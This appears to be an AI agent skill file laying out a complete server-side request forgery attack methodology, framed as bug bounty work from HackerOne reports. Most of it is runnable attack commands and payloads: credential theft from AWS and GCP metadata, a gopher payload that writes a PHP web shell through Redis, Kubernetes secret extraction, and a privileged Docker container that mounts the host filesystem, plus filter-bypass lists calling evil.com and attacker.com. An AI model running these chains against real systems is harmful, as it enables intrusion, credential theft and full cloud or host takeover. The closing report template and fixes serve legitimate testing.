---
name: ssrf-deep-dive
description: Complete SSRF methodology from 309 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - ssrf methodology
  - ssrf deep dive
  - ssrf complete
  - ssrf all techniques
  - skills ssrf
---

# Complete SSRF Methodology - From 309 HackerOne Reports

## Step 1: Recon for SSRF Parameters
Find every parameter that might make the server fetch a URL.

### Automated Parameter Discovery
```bash
# Find URL parameters from recon data
grep -E '(\?|&)(url|image|img|src|redirect|callback|next|file|load|fetch|link|href|page|endpoint|return|dest|notify|target|domain|host|goto|to|out|view|dir|show|forward|download|upload|document|pdf|template|import|export|logo|icon|avatar|picture|cover|banner|thumbnail|screenshot|preview|source|ref|reference|webhook|feed|rss|data|resource|path|location|continue|uri|redirect_uri|action|style|theme|subscribe|calendar|proxy|api|route|endpoint|loc|domain|hostname)[=:]' recon/{target}/urls.txt | sort -u

# Use Arjun to discover hidden params
arjun -u https://{target}/api/endpoint --get -oT params_ssrf.txt

# Use ParamSpider
python3 paramspider.py --domain {target} --exclude woff,css,png,svg,jpg
```

### Check Every Feature Type
For each feature below, test ALL URL-accepting parameters:

| Feature | Real Report Example |
|---------|-------------------|
| Webhook URLs | #2301565 - H1 webhook SSRF |
| Image from URL | #228377 - Discourse image upload |
| File upload from URL | #549882 - Vimeo upload SSRF |
| Video to GIF conversion | #115748 - Imgur vidgif SSRF |
| Office thumbnails | #671935 - Slack office SSRF |
| RSS feeds | #299135 - OX RSS SSRF |
| Calendar import | #758948 - Mail.ru calendar |
| Import projects | #826361 - GitLab import |
| GraphQL queries | #1864188 - EXNESS GraphQL SSRF |
| Analytics reports | #2262382 - H1 analytics SSRF |
| Website preview | #1960765 - Reddit preview |
| Image proxy | #811136 - PS image renderer |
| Sentry config | #374737 - H1 Sentry SSRF |
| Email config | #1736390 - Nextcloud mail SSRF |
| OAuth flows | #398799 - GitLab OAuth SSRF |
| SVG upload | #223203 - Shopify SVG SSRF |
| Video upload | #1062888 - TikTok video SSRF |
| SSO/SAML | #713900 - QIWI SSO SSRF |
| WebSocket | #2203188 - WebSocket SSRF |
| Docker API | #366638 - Uber Portainer SSRF |
| Grafana data sources | #878779 - GitLab Grafana |
| Slack commands | #381129 - Slack slash commands |

## Step 2: Basic SSRF Testing

### Test 1: External Interaction (OOB Detection)
```bash
# Set up listener first
nc -lvnp 4444

# Test every URL parameter
curl -sk "https://{target}/page?url=http://YOUR-IP:4444/test"
curl -sk "https://{target}/page?image=http://YOUR-IP:4444/test"
curl -sk "https://{target}/page?redirect=http://YOUR-IP:4444/test"
# Test ALL parameters from the wordlist

# Use Burp Collaborator / interactsh for better detection
curl -sk "https://{target}/page?url=http://YOUR-ID.oastify.com/ssrf"
```

### Test 2: Localhost Probe
```bash
# Direct localhost
curl -sk "https://{target}/page?url=http://127.0.0.1:8080/"
curl -sk "https://{target}/page?url=http://localhost:22/"
curl -sk "https://{target}/page?url=http://[::1]:80/"

# IP variants
curl -sk "https://{target}/page?url=http://0/"
curl -sk "https://{target}/page?url=http://127.1/"
curl -sk "https://{target}/page?url=http://0x7f000001/"
curl -sk "https://{target}/page?url=http://2130706433/"
```

### Test 3: Cloud Metadata
```bash
# AWS
curl -sk "https://{target}/page?url=http://169.254.169.254/latest/meta-data/"

# GCP
curl -sk -H "Metadata-Flavor: Google" "https://{target}/page?url=http://metadata.google.internal/computeMetadata/v1/"

# Azure
curl -sk -H "Metadata: true" "https://{target}/page?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Test 4: Internal Port Scan
```bash
# Quick scan of common ports
for port in 22 80 443 8080 8443 3000 3306 5432 6379 9200 27017 11211 53 389 25 587 2375 10250 8001 8500 9090 15672 5000 3001 5601 9200 9300 2181 9092 61616 2551 5555 4848 8082 8444 9990; do
  result=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://{target}/page?url=http://127.0.0.1:$port/" 2>/dev/null)
  if [ "$result" != "000" ] && [ -n "$result" ]; then
    echo "Port $port open: $result"
  fi
done
```

## Step 3: Deep SSRF Bypass Testing

### IP Obfuscation Techniques (30+ variations)
Test ALL of these for bypassing IP restrictions:

```bash
# Direct
127.0.0.1, 10.0.0.1, 172.16.0.1, 192.168.1.1

# Decimal
2130706433, 167772161, 2886729729, 3232235777

# Hex
0x7f000001, 0x0a000001, 0xac100001, 0xc0a80101

# Octal
0177.0.0.1, 012.0.0.1, 0254.020.0.1, 0300.0250.01.01

# Short form
0, 127.1, 10.1, 192.168.1, 0x7f.1

# IPv6 localhost
[::1], [::ffff:127.0.0.1], [0:0:0:0:0:ffff:7f00:1]

# NAT64 IPv6 prefix
[64:ff9b::1], [64:ff9b::c0a8:101], [64:ff9b::ac10:1]

# IPv4-mapped IPv6
[::ffff:127.0.0.1], [::ffff:10.0.0.1], [::ffff:192.168.1.1]

# Special DNS
localhost., localhost.rip, localtest.me, localhost.pw
1.1.1.1.nip.io, 127.0.0.1.nip.io, 127.0.0.1.xip.io
localtest.me, lvh.me, fuf.me
ssrf.localhost.pw, ssrf.sec.rapid7.com

# Double slash
http://127.0.0.1//
http://localhost//

# Credential confusion
http://evil.com@127.0.0.1/
http://evil.com:password@127.0.0.1:80/

# Parser confusion
http://127.0.0.1:80#@evil.com/
http://evil.com#@127.0.0.1/
http://evil.com%00@127.0.0.1/
http://127.0.0.1%00@evil.com/

# Redirect chain
http://open-redirect.com/redirect?url=http://127.0.0.1/
http://shorturl.at/XYZ (that redirects to 127.0.0.1)

# DNS rebinding
# Use a DNS rebinding service that answers with multiple IPs
# First DNS answer: legitimate IP (passes validation)
# Second DNS answer: 127.0.0.1 (actual request)
```

### Protocol Smuggling Techniques
```bash
# file:// - Local file read
file:///etc/passwd
file:///proc/1/environ
file:///var/log/apache2/access.log
file:///etc/nginx/nginx.conf
file:///proc/self/environ
file:///proc/self/fd/0

# gopher:// - TCP protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$4%0d%0abest%0d%0a*1%0d%0a$4%0d%0asave%0d%0aq
gopher://127.0.0.1:3306/_SELECT%201

# dict:// - Dictionary protocol
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
dict://127.0.0.1:9200/

# ftp:// - FTP
ftp://anonymous:anonymous@127.0.0.1:21/

# smb:// - Windows file share
smb://127.0.0.1/SharedDocs
smb://attacker.com/malicious

# ldap://
ldap://127.0.0.1:389/

# jar:// (Java)
jar:http://127.0.0.1!/path/
jar:https://evil.com!/exploit.jar

# php:// (PHP)
php://filter/convert.base64-encode/resource=/etc/passwd
php://expect://id
```

### Domain/Host-Level Bypasses
```bash
# Trailing dot (bypass Smokescreen)
http://localhost./
http://127.0.0.1./
http://0./
http://evil.com.@127.0.0.1/

# Double brackets (bypass Smokescreen)
http://[[127.0.0.1]]/
http://[[localhost]]/
http://[[0]]/

# Unicode homograph
http://localhost (using Cyrillic 'o')
http://127.0.0.1 (using fullwidth digits)

# Newline/CRLF injection
http://127.0.0.1%0d%0aX-Injected:%20test
http://evil.com%0d%0aHost:%20127.0.0.1

# Host header injection
curl -sk -H "Host: 127.0.0.1" "https://{target}/page?url=http://127.0.0.1/"
curl -sk -H "X-Forwarded-For: 127.0.0.1" "https://{target}/page?url=http://127.0.0.1/"
```

## Step 4: Full Read SSRF - Extract Data

### Cloud Metadata Extraction
```bash
# AWS - Full metadata dump
for path in \
  latest/meta-data/ \
  latest/user-data/ \
  latest/meta-data/iam/security-credentials/ \
  latest/meta-data/placement/availability-zone \
  latest/meta-data/public-keys/ \
  latest/meta-data/network/interfaces/macs/ \
  latest/dynamic/instance-identity/document \
  latest/meta-data/tags/instance/; do
  curl -sk "https://{target}/page?url=http://169.254.169.254/$path"
done

# GCP - Full metadata dump
for path in \
  computeMetadata/v1/ \
  computeMetadata/v1/instance/service-accounts/ \
  computeMetadata/v1/project/project-id \
  computeMetadata/v1/instance/zone \
  computeMetadata/v1/instance/tags; do
  curl -sk -H "Metadata-Flavor: Google" "https://{target}/page?url=http://metadata.google.internal/$path"
done

# Azure
curl -sk -H "Metadata: true" "https://{target}/page?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### Internal Service Enumeration

```bash
# Kubernetes API
curl -sk "https://{target}/page?url=http://localhost:10250/pods"
curl -sk "https://{target}/page?url=http://localhost:8001/api/v1/secrets"
curl -sk "https://{target}/page?url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets/"

# Docker API
curl -sk "https://{target}/page?url=http://localhost:2375/containers/json"
curl -sk "https://{target}/page?url=http://localhost:2375/version"

# Elasticsearch
curl -sk "https://{target}/page?url=http://localhost:9200/_cat/indices"
curl -sk "https://{target}/page?url=http://localhost:9200/_search?q=password"

# Redis (via gopher)
curl -sk "https://{target}/page?url=gopher://localhost:6379/_INFO"
curl -sk "https://{target}/page?url=dict://localhost:6379/info"

# Grafana
curl -sk "https://{target}/page?url=http://localhost:3000/api/datasources"
curl -sk "https://{target}/page?url=http://localhost:3000/api/org"

# Prometheus
curl -sk "https://{target}/page?url=http://localhost:9090/api/v1/targets"
curl -sk "https://{target}/page?url=http://localhost:9090/api/v1/query?query=up"

# MinIO / S3-compatible storage
curl -sk "https://{target}/page?url=http://localhost:9000/minio/"
```

## Step 5: SSRF Exploit Chains

### Chain 1: SSRF → AWS IAM Keys → Cloud Compromise
```bash
# Step 1: Enumerate IAM roles
curl -sk "https://{target}/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns: RoleName

# Step 2: Get credentials for the role
curl -sk "https://{target}/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName"
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 3: Use AWS CLI to enumerate
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls
aws ec2 describe-instances
aws iam list-roles
```

### Chain 2: SSRF → Redis → Web Shell → RCE
```bash
# Step 1: Write PHP webshell to webroot via Redis
# Using gopher protocol
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0assrf%0d%0a$24%0d%0a<?php system($_GET['c']);?>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a%0d%0a

# Step 2: Execute commands
curl -sk "https://{target}/shell.php?c=id"
```

### Chain 3: SSRF → Kubernetes API → Secrets/Cluster Admin
```bash
# Step 1: Find kubelet or API server
curl -sk "https://{target}/ssrf?url=http://localhost:10250/pods"

# Step 2: Extract service account token
curl -sk "https://{target}/ssrf?url=http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets/"

# Step 3: Use token for cluster operations
kubectl --token=EXTRACTED_TOKEN get secrets --all-namespaces
```

### Chain 4: SSRF → Internal Grafana → DB Credentials
```bash
# Step 1: List Grafana data sources
curl -sk "https://{target}/ssrf?url=http://localhost:3000/api/datasources"

# Step 2: Extract database credentials from config
# Often contains MySQL, PostgreSQL, or Prometheus credentials
```

### Chain 5: SSRF → Docker API → Container Escape
```bash
# Step 1: Check Docker API
curl -sk "https://{target}/ssrf?url=http://localhost:2375/containers/json"

# Step 2: Create privileged container
curl -X POST -sk "https://{target}/ssrf?url=http://localhost:2375/containers/create" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
```

## Step 6: Blind SSRF Exploitation

### Blind SSRF Detection Checklist
- [ ] Outbound DNS lookups (check DNS logs)
- [ ] Outbound HTTP requests (check collaborator)
- [ ] Response timing differences (slow endpoints = open)
- [ ] Response size differences (different content from different ports)
- [ ] Error messages revealing internal IPs
- [ ] Stack traces revealing internal hostnames

### Blind SSRF Techniques
```bash
# 1. OOB detection via HTTP
curl -sk "https://{target}/page?url=http://YOUR-ID.oastify.com/blind"

# 2. OOB detection via DNS
curl -sk "https://{target}/page?url=http://YOUR-ID.interactsh.com/dns"

# 3. OOB via XXE in uploaded file
# Upload SVG with:
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://YOUR-ID.oastify.com">]>
<svg>&xxe;</svg>

# 4. OOB via Excel/Office file
# Create Excel file with external DDE

# 5. Timing-based detection
time curl -sk "https://{target}/page?url=http://127.0.0.1:8080/slow"  # Slow = port might be open
time curl -sk "https://{target}/page?url=http://127.0.0.1:8181/fast"  # Fast = port closed

# 6. Error message analysis
# Look for: "Connection refused", "Connection timed out", 
# "Name or service not known", internal IPs in error messages
```

## Step 7: Validate & Report

### CVSS Scoring for SSRF
```
Basic SSRF (no data returned):       AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 4.3 Medium
SSRF with cloud metadata access:     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N → 7.5 High
SSRF with RCE:                       AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
SSRF chained to account takeover:    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
```

### Report Template
```markdown
**Summary:**
SSRF vulnerability in [parameter] at [endpoint] allows attacker to make 
internal HTTP requests, leading to [impact].

**Impact:**
An attacker can exploit this SSRF to [read cloud metadata / scan internal network / 
access internal services / achieve RCE / take over accounts].

**Steps to Reproduce:**
1. Send request to: [request]
2. Observe: [evidence of SSRF]

**Proof of Concept:**
Request:
GET /page?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com

Response:
[
  "ami-id",
  "iam/",
  "instance-id",
  ...
]

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High)

**Suggested Fix:**
1. Use an allowlist of permitted URLs
2. Disable unnecessary URL schemes (gopher, dict, file, etc.)
3. Use a dedicated SSRF protection proxy (Smokescreen)
4. Block access to private IP ranges
5. Restrict outbound network access
```

## SSRF Automation Script
```bash
#!/bin/bash
# Full SSRF scan for a target
TARGET=$1
PARAMS="url image img src redirect callback next file load fetch link href page endpoint return dest dest destination continue view path notify_url readapi image_host avaOp target domain host goto to out dir show forward download upload document pdf template import export logo icon avatar picture cover banner thumbnail screenshot preview source ref reference webhook"

for param in $PARAMS; do
  # Cloud metadata test
  for endpoint in \
    "http://169.254.169.254/latest/meta-data/" \
    "http://metadata.google.internal/computeMetadata/v1/" \
    "http://127.0.0.1:8080/" \
    "http://localhost:22/"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/page?$param=$(echo $endpoint | sed 's/:/%3a/g;s/\//%2f/g')" 2>/dev/null)
    if [ "$code" != "000" ] && [ -n "$code" ]; then
      echo "SSRF: $param -> $endpoint ($code)"
    fi
  done
done
```

## Advanced SSRF Techniques (Expanded)

1. **DNS Rebinding for SSRF Bypass** - If the server validates the hostname first but then resolves again during fetch (double-resolve race), use DNS rebinding: set TTL=0, serve A record = safe IP (e.g., 127.0.0.1) for validation, then switch to internal IP (e.g., 169.254.169.254) during fetch. Tools: rebind.it, 1u.ms, lock.cmpxchg.io. Python script for custom rebind server. Real report: #2092 (DNS rebind to bypass AWS metadata protection).

2. **SSRF via Cloud Providers** - Tencent Cloud `metadata.tencentyun.com`, DigitalOcean `169.254.169.254/metadata/v1/`, Alibaba `100.100.100.200`, OpenStack `169.254.169.254/openstack`, IBM Cloud `api.service.cloud.ibm.com`. All endpoint paths with token extraction methodology.

3. **SSRF via PDF Generators** - wkhtmltopdf, puppeteer/Playwright, PhantomJS, TCPDF. Inject `<iframe src="http://internal/">` or `<img src="http://169.254.169.254/">` into markdown/WYSIWYG/template that gets PDF-rendered. Real reports: Shopify #207673 ($5,000), Slack #271113.

4. **SSRF via WebSocket Proxy** - If the application has a WebSocket endpoint that proxies connections, use `wss://yourserver.com/` for out-of-band detection. The WebSocket handshake bypasses many SSRF allowlists because it uses a different protocol handler.

5. **Blind SSRF Detection with Collaborator** - For truly blind SSRF, use interactsh/ Burp Collaborator. Deploy payloads in URL params, headers (X-Forwarded-For, Referer), XML/SOAP bodies, file upload URLs. Configuration steps for custom collaborator domain logging every DNS/HTTP hit.

6. **Gopher Protocol Deep Dive** - Craft manual Gopher payloads for Redis: `gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aCONFIG%0d%0a$4%0d%0aSET%0d%0a...` for RCE via cron. For SSRF to MySQL/Memcached/SMTP, template for each service.

7. **SSRF via DNS Rebinding + TOCTOU Race** - If the app has two DNS resolutions (one for validation, one for fetch), exploit micro-window. Mitigation check: single resolve vs double resolve. How to test: send many concurrent requests while switching DNS.

8. **SSRF via Alternate Protocols** - dict:// (protocol allows arbitrary commands), ftp:// (FTP redirect to internal), file:// (if not filtered), jar:// (Java URL handler), ldap:///ldaps://, tftp://, netdoc://. Real report: #2378926 Discord dict protocol SSRF ($5,000).

9. **SSRF to RCE Chains** - SSRF → Redis (cron RCE through Gopher), SSRF → Memcached (stored XSS payload), SSRF → MySQL (read local file via LOAD DATA), SSRF → Elasticsearch (RCE via Groovy script), SSRF → Minio (S3 credential theft), SSRF → Consul (service registration RCE). Step-by-step for each.

10. **Red Team SSRF Detection Automation** - x3scanner with SSRF module, interactsh-web, Gopherus for automated Redis payload generation, SSRFmap framework, See-SURF for blind SSRF. Compare each tool's effectiveness.

11. **WAF Bypass for SSRF** - DNS rebinding, redirect-based bypass (external server that 302 redirects to internal), protocol smuggling (http:// → HTTP/1.1 @), decimal/octal IP encoding (2130706433 = 127.0.0.1), IPv6 mapping (::ffff:127.0.0.1), URL parser confusion with @ and #.

12. **SSRF via API Proxy/Passthrough** - If the app has an API proxy endpoint (`/api/proxy?url=...`), test with internal services, cloud metadata, admin panels. Real reports: Wire #204323, HackerOne #1406938.

## Additional Techniques (External Sources)

### STUN Protocol SSRF
STUN (Session Traversal Utilities for NAT) servers can be abused for SSRF. By controlling the STUN server response, you can redirect internal requests to arbitrary internal endpoints.
- **Slack #333419** ($3,500): STUN protocol-based SSRF allowing internal network scanning

### SSRF via DNS Key-Lookup Redirection
By controlling DNS records (e.g., through a domain you own), you can redirect internal server key lookups to arbitrary IPs. The application performs a DNS lookup for a key (e.g., `KEYID.yourdomain.com`) which resolves to an internal IP like `127.0.0.1` or `169.254.169.254`, bypassing host-based allowlists.

### SSRF through Gopher Protocol (Public Class/Method Access)
When all classes and methods in the URL/protocol handler are declared public, the Gopher protocol can be used to craft arbitrary TCP packets to internal services like Redis, MySQL, or Memcached without restrictions.

### SSRF through PlantUML `!include` Directive
PlantUML's `!include` directive fetches external resources during diagram rendering. By embedding a malicious PlantUML diagram with `!include http://internal-service/`, you can trigger SSRF to internal services.
- **GitLab #358**: PlantUML SSRF to internal network

### Chaining Grafana Redirects for SSRF
Grafana's redirect functionality accepts any HTTP verb to any endpoint. By chaining an open redirect in Grafana (e.g., `/grafana/redirect?url=http://169.254.169.254/`), you can bypass SSRF protections that only check the initial request URL. Any HTTP method (GET, POST, PUT, DELETE) can be used to trigger the redirect.

## Quick Reference: Top SSRF Reports by Technique
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1406938 | Dropbox | Google Drive full response SSRF | $17,576 |
| #826361 | GitLab | Project import attachment SSRF | $10,000 |
| #1960765 | Reddit | Blind SSRF via preview API | $6,000 |
| #923132 | Dropbox | AWS private keys via SSRF | $4,913 |
| #671935 | Slack | Office file thumbnail SSRF | $4,000 |
| #398799 | GitLab | OAuth Jira blind SSRF | $4,000 |
| #713900 | QIWI | SSRF → RCE via SSO | $0 (critical) |
| #1062888 | TikTok | FFmpeg HLS SSRF → file read | $2,727 |
